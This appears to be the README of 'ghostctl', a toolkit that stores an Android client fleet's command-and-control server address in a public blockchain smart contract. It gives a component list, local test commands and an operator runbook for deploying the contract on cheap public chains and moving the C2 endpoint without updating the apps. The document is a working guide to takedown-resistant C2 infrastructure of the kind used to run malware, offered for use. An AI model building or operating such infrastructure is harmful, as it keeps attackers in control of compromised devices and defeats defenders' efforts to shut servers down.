# ghostctl blockchain C2-endpoint registry

The Android clients never hardcode the server address. The current C2
endpoint (`host[:port]`) lives in a tiny public smart contract; clients
resolve it via read-only `eth_call` on every connect/reconnect (and hourly
while connected). Moving the C2 server = one owner transaction. No app
update, no re-deploy.

## Contents

- `EndpointRegistry.sol` — the contract (solidity ^0.8.24). Public string
  `endpoint`, owner-only `setEndpoint(string)`, `EndpointUpdated(string,uint256)`
  event. The `endpoint()` view getter is auto-generated by the public var.
- `read_endpoint.py` — resolve current endpoint via plain JSON-RPC `eth_call`
  (stdlib urllib only, no web3.py). Supports multiple `--rpc` fallbacks.
- `deploy.py` — one-time deployment. Private key from env `GHOST_DEPLOY_KEY`.
- `update_endpoint.py` — owner tx calling `setEndpoint`. Key from env
  `GHOST_DEPLOY_KEY` (must be the deployer/owner key).
- `rpc_list.py` — suggested free public RPC URLs per chain.
- `ethlib.py` — minimal stdlib-only helpers (JSON-RPC, keccak256, secp256k1
  signing, RLP) so no pip dependencies are needed on the VPS.
- `foundry.toml` — build config; `forge build` produces `out/` (gitignored).

## Build

    forge build   # foundry; installs to ~/.foundry/bin, symlinked in ~/bin

## Local test (anvil)

    anvil &                                    # local dev chain (chainId 31337)
    export GHOST_DEPLOY_KEY=0xac09...ff80      # anvil dev account #0
    ADDR=$(python3 deploy.py --rpc http://127.0.0.1:8545 --endpoint host:443)
    python3 read_endpoint.py --rpc http://127.0.0.1:8545 --address $ADDR
    python3 update_endpoint.py --rpc http://127.0.0.1:8545 --address $ADDR --endpoint newhost:8443
    python3 read_endpoint.py --rpc http://127.0.0.1:8545 --address $ADDR   # newhost:8443

## Deploying for real (operator runbook)

1. Pick a chain readable via multiple free keyless public RPCs.
   Suggestions (see `rpc_list.py` for 3+ URLs each):
   - Polygon PoS (chainId 137) — very cheap writes, many public RPCs
   - Base (chainId 8453) — cheap, excellent RPC availability
   - Optimism (chainId 10) — cheap alternative
2. Fund a dedicated wallet on that chain (operator's own wallet; keep the
   key out of this repo — set via env var, never hardcode):
       export GHOST_DEPLOY_KEY=0x<your funded key>
3. Deploy:
       python3 deploy.py --rpc <one of the public RPC URLs> \
           --endpoint c2.yourdomain.tld:443
   Prints the deployed contract address. Fund with ~a few cents of gas —
   each future `setEndpoint` is one cheap tx.
4. Verify the read path from an outside network:
       python3 read_endpoint.py --rpc <rpc1> --rpc <rpc2> --rpc <rpc3> \
           --address 0x<deployed address>

## Updating the endpoint (e.g. after a server/IP move)

    export GHOST_DEPLOY_KEY=0x<owner key>
    python3 update_endpoint.py --rpc <public RPC> --address 0x<contract> \
        --endpoint newc2.yourdomain.tld:443

Only the deployer/owner key can call `setEndpoint`; anyone can read.

## Constants baked into the Android app

- The deployed **contract address** (immutable, does not change).
- The **chainId + RPC URL list** (see `rpc_list.py`; app should try in
  order with fallback and cache last-known-good endpoint locally).

Everything else (host, port) is read from the chain at runtime. A DNS
name is preferable to a raw IP so most moves need no transaction at all;
the on-chain update covers IP moves and port changes.
